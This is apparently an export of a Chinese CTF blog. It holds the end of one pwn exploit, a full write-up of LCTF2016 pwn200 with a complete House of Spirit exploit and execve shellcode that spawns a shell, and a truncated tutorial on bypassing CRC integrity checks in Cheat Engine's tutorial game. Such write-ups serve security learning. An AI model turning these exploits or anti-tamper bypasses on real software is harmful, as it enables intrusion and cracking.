class="number">64</span>)</span><br><span class="line">leavemsg(msg)</span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">add(<span class="string">'b'</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leavemsg(p32(system) + ';/bin/sh\x00')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leavemsg(p32(system))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>[HOS]LCTF2016-pwn200</title>
    <url>/2020/02/17/HOS-LCTF2016-pwn200/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/2.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li>本文是对<code>CTF-WIKI</code>中<code>House Of Spirit</code>的一道例题的解析，这道题费了不小功夫，也算是弄明白了。</li></ul><ul><li>参考链接:</li></ul><p><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">安全客</a></p><p><a href="https://www.anquanke.com/post/id/84679" target="_blank" rel="noopener">官方WP</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><ul><li>题目下载地址:<a href="https://github.com/Winter3un/ctf_task/tree/master/LCTF2016/pwn200" target="_blank" rel="noopener">下载地址</a></li></ul><h1 id="0x01-温习"><a href="#0x01-温习" class="headerlink" title="0x01 温习"></a>0x01 温习</h1><h2 id="什么是House-of-Spirit"><a href="#什么是House-of-Spirit" class="headerlink" title="什么是House of Spirit"></a>什么是House of Spirit</h2><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p><p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200217185939.png" alt></p><p>（2）存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>（1）伪造堆块</p><p>hos的主要意图就是在可控1及可控2构造好数据，将它伪造成一个fastbin。</p><p>（2）覆盖堆指针指向上一步伪造的堆块。</p><p>（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。</p><p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>主要保护都关了，可以执行shellcode。</p><h2 id="漏洞点1"><a href="#漏洞点1" class="headerlink" title="漏洞点1"></a>漏洞点1</h2><p><code>sub_400A8E函数</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400A8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"who are u?"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;v2[i], <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v2[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s, welcome to xdctf~\n"</span>, v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"give me your id ~~?"</span>);</span><br><span class="line">  MyRead();</span><br><span class="line">  <span class="keyword">return</span> sub_400A29();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>off-by-one</code>漏洞。当输入48个字符的时候，会连带着将RBP里的值打印出来。这是因为read函数读取字符串的时候不会在末尾加上<code>\x00</code></p><h2 id="漏洞点2"><a href="#漏洞点2" class="headerlink" title="漏洞点2"></a>漏洞点2</h2><p><code>sub_400A29函数</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400A29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"give me money~"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;buf);</span><br><span class="line">  ptr = dest;</span><br><span class="line">  <span class="keyword">return</span> sub_4009C4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于buf的大小只有 0x40-0x8 = 0x38，但是却读入了0x40字节，会覆盖掉dest的指针，而dest是一个堆指针，这样就满足了HOS利用条件之一<code>存在可将堆变量指针覆盖指向为可控区域</code></p><h2 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h2><p>漏洞2满足了HOS利用条件之一，实际上另一个利用条件在<code>sub_400A8E函数</code>输入ID的地方也得到了满足，只是由于IDA反编译的一些问题，没有显示出来，但是从汇编界面看的话</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200217193246.png" alt></p><p>能够看到程序将rax(里面存放的Myread函数的返回值，也就是咱们输入的ID)里的值存放到了<code>rbp-0x38</code>的位置。</p><ul><li>每个栈帧的大小可以通过IDA查看，例如下图就是sub_400A8E函数的栈帧，也能看出来它栈帧大小是0x50</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200217195709.png" alt></p><p>从整个程序的栈结构来看:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+------------+-----                                  -</span><br><span class="line">|    ...     | money(<span class="number">0x38</span>) 实际读入<span class="number">0x40</span>，能覆盖dest    ↑</span><br><span class="line">+------------+                               sub_400A29栈帧(<span class="number">0x40</span>)</span><br><span class="line">|    dest    |                                       ↓</span><br><span class="line">+------------+-----                                  -</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----              -</span><br><span class="line">|    ...     |这里占<span class="number">0x18</span>,是别的东西↑</span><br><span class="line">+------------+                   |</span><br><span class="line">|     ID     |           sub_400A8E栈帧(<span class="number">0x50</span>)</span><br><span class="line">+------------+                   |</span><br><span class="line">|    ...     |   name(<span class="number">0x30</span>)      ↓</span><br><span class="line">+------------+-----              -</span><br><span class="line">|     rbp    |   <span class="comment">#这个rbp存的值实际上就是下面的rbp_addr，也就是main函数的栈底</span></span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |        main栈帧(<span class="number">0x10</span>)</span><br><span class="line">+------------+&lt;----rbp_addr</span><br></pre></td></tr></table></figure><p>也就是形成了这种格局。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200217195301.png" alt></p><h2 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4009C4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v0 = MyRead();</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      checkout();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">      checkin();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"good bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"already check in"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"how long?"</span>);</span><br><span class="line">  LODWORD(nbytes) = MyRead();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &lt;= <span class="number">0</span> || (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid length"</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"give me more money : "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  read(<span class="number">0</span>, ptr, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"in~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out~"</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"havn't check in"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>程序依然提供checkin、checkout、exit函数。</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>将shellcode.ljust(48,’a’)输入到name中，通过<code>off-by-one</code>漏洞打印出来main函数栈底，通过上面结构图能够算出shellcode的地址，选取一个处在money中的位置作为fake_chunk</p></li><li><p>在money中伪造堆块size，在id里面输入的是下一个堆块的size(大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>)，同时通过堆溢出漏洞覆盖掉dest</p></li><li><p>free掉刚才伪造的堆块，使其进入fastbin</p></li><li><p>申请堆块，申请出来以后还是在老位置。</p></li><li><p>输入数据到刚申请的堆块中，覆盖掉rip，让其指向shellcode，完成劫持，执行shellcode。</p></li></ol><h1 id="0x03-Let’s-do-it"><a href="#0x03-Let’s-do-it" class="headerlink" title="0x03 Let’s do it!"></a>0x03 Let’s do it!</h1><p>shellcode可以选用现成的，也可以通过pwntools的shellcraft生成。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="string">'amd64'</span>)</span><br></pre></td></tr></table></figure><h2 id="泄露rbp-并选择合适的fakechunk地址"><a href="#泄露rbp-并选择合适的fakechunk地址" class="headerlink" title="泄露rbp 并选择合适的fakechunk地址"></a>泄露rbp 并选择合适的fakechunk地址</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = shellcode.ljust(<span class="number">46</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += <span class="string">'bb'</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.recvuntil(<span class="string">'bb'</span>)</span><br><span class="line">rbp_addr = c.recvuntil(<span class="string">', w'</span>)[:<span class="number">-3</span>]</span><br><span class="line">rbp_addr = u64(rbp_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'rbp_addr = '</span> + hex(rbp_addr))</span><br><span class="line">fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line">shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br></pre></td></tr></table></figure><ul><li>注意这里shellcode的地址，可以根据前面的栈结构图来求得，<code>0x50 = 0x30(name) + 0x8(rbp) + 0x8(rip) + 0x10(main栈帧)</code></li></ul><h2 id="伪造下一个堆块的size"><a href="#伪造下一个堆块的size" class="headerlink" title="伪造下一个堆块的size"></a>伪造下一个堆块的size</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.recvuntil(<span class="string">'id ~~?'</span>)</span><br><span class="line">c.sendline(<span class="string">'48'</span>)</span><br></pre></td></tr></table></figure><p>这个size没有太严格要求，只需要大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></p><h2 id="在money中伪造堆块并覆盖dest"><a href="#在money中伪造堆块并覆盖dest" class="headerlink" title="在money中伪造堆块并覆盖dest"></a>在money中伪造堆块并覆盖dest</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c.recvuntil(<span class="string">'money~'</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x41</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>, <span class="string">'\x00'</span>) + p64(fake_addr) </span><br><span class="line">c.send(payload)</span><br></pre></td></tr></table></figure><ul><li>这里前面用p64(0)有好处，就是能够使<code>sub_400A29</code>中的<code>strcpy(dest, &amp;buf);</code>不起作用。</li><li>这么构造也能和前面我们所选取的fakechunk的地址fake_addr相呼应。具体可以gdb调试一下就能看出来了。</li><li>这里选取p64(0x41)是因为这样能够使ID正好相当于我们伪造chunk的nextchunk的size，具体可以画画图或者调试一下就可以了。</li></ul><h2 id="free然后重新申请，并劫持程序"><a href="#free然后重新申请，并劫持程序" class="headerlink" title="free然后重新申请，并劫持程序"></a>free然后重新申请，并劫持程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#free</span></span><br><span class="line">c.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">c.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc</span></span><br><span class="line">c.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'long?'</span>)</span><br><span class="line">c.sendline(<span class="string">'48'</span>) <span class="comment"># 0x30   because fakechunk's size = 0x41</span></span><br><span class="line">c.recvuntil(<span class="string">'\n48\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite rip</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(shellcode_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">48</span>, <span class="string">'\x00'</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell by exit</span></span><br><span class="line">c.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">c.sendline(<span class="string">'3'</span>) </span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><ul><li>需要注意的几个点都加了注释了。</li></ul><p>由于我们的栈结构在这几步时大概是这样的:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+------------+-----                低地址</span><br><span class="line">这边还有checkin、checkout之类的栈帧</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">sub_4009C4栈帧(<span class="number">0x10</span>)</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">sub_400A29栈帧(<span class="number">0x40</span>)</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    | &lt;- 我们劫持的是这个rip</span><br><span class="line">+------------+-----</span><br><span class="line">sub_400A8E栈帧(<span class="number">0x50</span>)</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line"> main栈帧(<span class="number">0x10</span>)</span><br><span class="line">+------------+&lt;----rbp_addr         高地址</span><br></pre></td></tr></table></figure><p>当我们执行exit以后，栈帧还原，按照地址从低往高的顺序执行rip，当执行到被我们劫持，也就是被我们改成shellcode地址的rip的时候，就能执行shellcode从而getshell了~</p><h1 id="0x04-完整exp"><a href="#0x04-完整exp" class="headerlink" title="0x04 完整exp"></a>0x04 完整exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">"./pwn200"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">46</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += <span class="string">'bb'</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.recvuntil(<span class="string">'bb'</span>)</span><br><span class="line">rbp_addr = c.recvuntil(<span class="string">', w'</span>)[:<span class="number">-3</span>]</span><br><span class="line">rbp_addr = u64(rbp_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'rbp_addr = '</span> + hex(rbp_addr))</span><br><span class="line">fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line">shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'id ~~?'</span>)</span><br><span class="line">c.sendline(<span class="string">'48'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'money~'</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x41</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>, <span class="string">'\x00'</span>) + p64(fake_addr) </span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free</span></span><br><span class="line">c.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">c.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc</span></span><br><span class="line">c.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'long?'</span>)</span><br><span class="line">c.sendline(<span class="string">'48'</span>) <span class="comment"># 0x30   because fakechunk's size = 0x41</span></span><br><span class="line">c.recvuntil(<span class="string">'\n48\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite rip</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(shellcode_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">48</span>, <span class="string">'\x00'</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell by exit</span></span><br><span class="line">c.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">c.sendline(<span class="string">'3'</span>) </span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>CRC Check Bypass</title>
    <url>/2022/03/18/CRC-Check-Bypass/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_45691349_20190407_172803.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>太久没有更博客了，今天记录一下前段时间学到的完整性检测绕过，比如绕过CRC检测。</p><p>像一些程序，总会有一些完整性检测比如CRC。当用逆向工程的方法修改程序的代码时，程序可能会做出响应的对抗操作。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>这类检测往往是对程序的代码段进行CRC检测来判断程序的代码段是否被修改，进行CRC检测有许多好处，如能防止通过修改程序代码来暴力破解一些软件等</p><p>CRC校验值往往会存在内存中的某个位置</p><p>CRC检测的代码也会位于代码段</p><p>CRC检测几乎都会有<code>cmp 正常情况的CRC,实际检测到的CRC</code>然后跳转的操作。</p><p>基于如上分析，不难有以下几种思路，可能有不对的地方，还望各位大佬斧正！</p><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>在不改变代码段的情况下，找到存放CRC校验值的内存地址，跟踪这个内存地址，找到CRC检测的相关汇编。</p><p>然后去修改<code>cmp 正常情况的CRC,实际检测到的CRC</code>后的<code>跳转</code>，强行让程序往”检测无误的方向”进行跳转。</p><p><code>本思路优点</code>:简单粗暴，省时省力。</p><p><code>本思路缺点</code>:可能会有暗门。</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>在不改变代码段的情况下，找到存放CRC校验值的内存地址，跟踪这个内存地址，找到CRC检测的相关汇编。</p><p>然后主动按照我们的意愿来修改代码段，然后主动用CRC算法来得到修改后的代码段的校验值，然后将这个校验值存到一个不用的内存地址中。</p><p>强行修改CRC检测相关汇编的<code>传地址过程</code>以实现<code>cmp 我们存的CRC校验值,实际检测到的CRC校验值</code>的效果，按照前面的操作，我们存的CRC校验值就应该与实际检测到的CRC校验值相等，从而使得程序往”检测无误的方向”跳转。</p><p><code>本思路优点</code>:呃……</p><p><code>本思路缺点</code>:①实现过程中(主动修改代码段但还没来得及修改cmp部分时)，有可能直接触发CRC检测未通过；②实现起来较为麻烦；③用来存放我们计算得到的CRC校验值的时候，这个存放地址有可能选到奇奇怪怪的会触发异常的位置(虽然可以凭经验来选到一些好位置)</p><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p>不改变代码段，将整个代码段复制到一个不用的内存地址，同思路一和二找到CRC检测的相关汇编</p><p>这次是去修改CRC检测相关汇编的<code>扫描起点</code>与<code>扫描终点</code>，也有可能是<code>扫描起点</code>与<code>扫描长度</code>的形式</p><p>让程序去扫描我们存的代码段备份，这样我们就能放心对程序的代码段进行修改了</p><p><code>本思路优点</code>:①这种”乾坤大挪移”的思想很爽；②用这种思路写出来的脚本的通用性较强，大部分情况下只需要修改脚本的部分内容就能实现绕过检测。</p><p><code>本思路缺点</code>:①实现起来略有些麻烦；②空间复杂度较高。</p><h2 id="思路四"><a href="#思路四" class="headerlink" title="思路四"></a>思路四</h2><p>这个思路源自《加密与解密》第四版P546的⑧</p><p>思路类似于思路三，只不过这次是依然检测原始部分，但执行新部分。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重新将要HOOK的模块加载到内存中,然后人为制造异常,把执行流程切换到新加载的模块中。在新加载的模块中仍然可以进行各种HOOK操作,此时守方的检测程序仍然在检测原始的模块,这样就检测不到HOOK了。</span><br></pre></td></tr></table></figure><h1 id="0x02-Do-it"><a href="#0x02-Do-it" class="headerlink" title="0x02 Do it!"></a>0x02 Do it!</h1><p>以CE自带的<code>CE Game tutorials</code>为例，采用思路三</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405230543.png" alt></p><p>当修改它的代码段时，标题会变成<code>(Integrity check error)</code></p><p>将代码段还原以后，标题就恢复正常</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>首先我们要找一段汇编代码段，要找出是什么访问了该汇编代码段。</p><p>下面先来寻找一段代码段：这里就找一段和靶子血量相关的汇编代码吧，借助CE可以很简单地找到靶子血量的内存地址，<code>找出什么访问了这个地址</code>(靶子血量地址)，从而发现这么一段给靶子血量赋值的汇编代码，并记录下来这段汇编代码的地址<code>10003F45D</code>。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405230926.png" alt></p><p>接下来，我们要找到是什么一直持续访问这段汇编代码(<code>mov eax,[rcx+70]</code>)</p><p>由于我使用的无插件的CE，无法直接在Memory Viewer中右键汇编代码然后查找什么访问了这段汇编代码</p><p>无奈只能手动在CE中添加这段汇编的地址</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405231300.png" alt></p><p>确定后，进而右键-<code>找出是什么访问了这个地址</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405231343.png" alt></p><p>可以发现这里有三个位置持续访问该代码段。</p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>由于<strong>这三个位置也位于代码段</strong>，所以我们必须保证这三个位置<strong>同时</strong>被修改。</p><p>下面尝试CE自带的<strong>自动汇编</strong></p><p>对这三个位置中任意一个右键-在反汇编程序中显示地址-工具-自动汇编-模板-CT表框架代码；模板-代码注入-确定即可</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405233143.png" alt></p><p>保持这个自动汇编窗口不关闭</p><p>然后<strong>依次对另外两个位置</strong> 右键-在反汇编程序中显示地址（目的主要是定位到这个位置，后续点击代码注入后框框里面直接就是这个地址了，算是借助CE的一些方便之处来省时省力了），然后模板-代码注入-确定。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405233905.png" alt></p><p>这么弄完以后就已经生成了82行的框架了，不得不说CE在自动汇编这块确实比方便。</p><p>采用思路三，我们需要先将代码段进行一次备份。</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">&#123;$lua&#125;</span><br><span class="line"><span class="keyword">if</span> addressOfCopy==<span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">   addressOfCopy=copyMemory(getAddress(process),getModuleSize(process))</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line">alloc(addressThatHoldsTheMoudleBase,8)</span><br><span class="line">alloc(addressThatHoldsTheModuleEnd,8)</span><br><span 